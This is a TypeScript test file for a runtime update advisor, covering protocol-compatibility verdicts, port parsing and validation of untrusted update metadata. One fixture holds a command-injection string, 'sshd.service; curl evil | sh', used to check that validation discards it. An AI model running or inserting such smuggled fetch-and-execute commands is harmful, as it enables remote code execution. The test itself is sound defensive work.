import { describe, expect, it } from 'vitest'
import {
  buildRuntimeUpdateAdvisorGuide,
  deriveRuntimeUpdateGuideInput,
  parseEndpointPortHint
} from './runtime-update-advisor-model'
import {
  describeRuntimeCompatBlock,
  type RuntimeCompatVerdict
} from '../../../../shared/protocol-compat'
import { DEFAULT_SERVICE_NAME } from '../../../../shared/runtime-update-info-validation'
import type { RuntimeStatus, RuntimeUpdateInfo } from '../../../../shared/runtime-types'

const CLIENT_TOO_OLD: RuntimeCompatVerdict = {
  kind: 'blocked',
  reason: 'client-too-old',
  clientProtocolVersion: 1,
  serverProtocolVersion: 5,
  requiredClientProtocolVersion: 4
}

const SERVER_TOO_OLD: RuntimeCompatVerdict = {
  kind: 'blocked',
  reason: 'server-too-old',
  clientProtocolVersion: 5,
  serverProtocolVersion: 1,
  requiredServerProtocolVersion: 4
}

const OK: RuntimeCompatVerdict = {
  kind: 'ok',
  clientProtocolVersion: 5,
  serverProtocolVersion: 5
}

function status(updateInfo?: RuntimeUpdateInfo): RuntimeStatus {
  return {
    runtimeId: 'remote-runtime',
    rendererGraphEpoch: 0,
    graphStatus: 'ready',
    authoritativeWindowId: null,
    liveTabCount: 0,
    liveLeafCount: 0,
    hostPlatform: 'linux',
    updateInfo
  }
}

describe('buildRuntimeUpdateAdvisorGuide verdict branching', () => {
  it('returns null when the verdict is ok', () => {
    expect(buildRuntimeUpdateAdvisorGuide({ verdict: OK, status: status() })).toBeNull()
  })

  it('routes client-too-old to the local updater with no server command blocks', () => {
    // Even when the server advertises a command-producing install shape, the
    // client-too-old path must never surface server commands.
    const guide = buildRuntimeUpdateAdvisorGuide({
      verdict: CLIENT_TOO_OLD,
      status: status({ installKind: 'linux-appimage', restartKind: 'systemd' })
    })
    expect(guide?.direction).toBe('client-too-old')
    if (guide?.direction !== 'client-too-old') {
      throw new Error('expected client-too-old guide')
    }
    expect(guide.localUpdate).toBe(true)
    expect(guide.message).toBe(describeRuntimeCompatBlock(CLIENT_TOO_OLD))
    // The client-too-old shape has no steps field at all — no command blocks.
    expect('steps' in guide).toBe(false)
  })

  it('produces copyable command steps for a server-too-old AppImage host', () => {
    const guide = buildRuntimeUpdateAdvisorGuide({
      verdict: SERVER_TOO_OLD,
      status: status({ installKind: 'linux-appimage', restartKind: 'systemd' }),
      portHint: 6900
    })
    if (guide?.direction !== 'server-too-old') {
      throw new Error('expected server-too-old guide')
    }
    expect(guide.steps.some((step) => step.kind === 'command')).toBe(true)
    expect(guide.protocol).toEqual({ running: 1, required: 4 })
  })
})

describe('deriveRuntimeUpdateGuideInput trust boundary', () => {
  it('passes untrusted updateInfo through validation before building the guide', () => {
    const derived = deriveRuntimeUpdateGuideInput({
      verdict: SERVER_TOO_OLD,
      status: status({
        installKind: 'linux-appimage',
        restartKind: 'systemd',
        // Injection attempt: must be discarded and replaced with the default.
        serviceName: 'sshd.service; curl evil | sh',
        // Unrecognized enum → 'unknown' is never surfaced here because
        // installKind above is valid, but a bad hostArch must be dropped.
        hostArch: 'sparc'
      }),
      portHint: 6900
    })
    expect(derived.installKind).toBe('linux-appimage')
    expect(derived.restartKind).toBe('systemd')
    expect(derived.serviceName).toBe(DEFAULT_SERVICE_NAME)
    expect(derived.hostArch).toBeUndefined()
    expect(derived.port).toBe(6900)
    // assetUrl is owned by a later unit and must stay unset here.
    expect(derived.assetUrl).toBeUndefined()
  })

  it('lets client-fetched manifest metadata win over server-supplied hints', () => {
    const derived = deriveRuntimeUpdateGuideInput({
      verdict: SERVER_TOO_OLD,
      status: status({
        installKind: 'linux-deb',
        currentVersion: '1.0.0',
        // Startup-stale server hints — the manifest must override them.
        latestVersion: '1.1.0',
        updateAvailable: false
      }),
      releaseMetadata: {
        latestVersion: '1.4.0',
        updateAvailable: true,
        assetUrl:
          'https://github.com/stablyai/orca/releases/latest/download/orca-ide_1.4.0_amd64.deb'
      }
    })
    expect(derived.latestVersion).toBe('1.4.0')
    expect(derived.updateAvailable).toBe(true)
    expect(derived.assetUrl).toBe(
      'https://github.com/stablyai/orca/releases/latest/download/orca-ide_1.4.0_amd64.deb'
    )
  })

  it('falls back to server-supplied version hints while the manifest is absent', () => {
    const derived = deriveRuntimeUpdateGuideInput({
      verdict: SERVER_TOO_OLD,
      status: status({ latestVersion: '1.1.0', updateAvailable: true })
    })
    expect(derived.latestVersion).toBe('1.1.0')
    expect(derived.updateAvailable).toBe(true)
    expect(derived.assetUrl).toBeUndefined()
  })

  it('maps unrecognized install/restart kinds to unknown', () => {
    const derived = deriveRuntimeUpdateGuideInput({
      verdict: SERVER_TOO_OLD,
      status: status({
        installKind: 'made-up-kind' as RuntimeUpdateInfo['installKind'],
        restartKind: 'made-up' as RuntimeUpdateInfo['restartKind']
      })
    })
    expect(derived.installKind).toBe('unknown')
    expect(derived.restartKind).toBe('unknown')
  })
})

describe('parseEndpointPortHint', () => {
  it('extracts an explicit port from the paired endpoint', () => {
    expect(parseEndpointPortHint('wss://example.com:6768/pair')).toBe(6768)
  })

  it('returns undefined without an explicit port or for unparseable input', () => {
    expect(parseEndpointPortHint('wss://example.com/pair')).toBeUndefined()
    expect(parseEndpointPortHint('not a url')).toBeUndefined()
    expect(parseEndpointPortHint(undefined)).toBeUndefined()
    expect(parseEndpointPortHint(null)).toBeUndefined()
    expect(parseEndpointPortHint('')).toBeUndefined()
  })
})
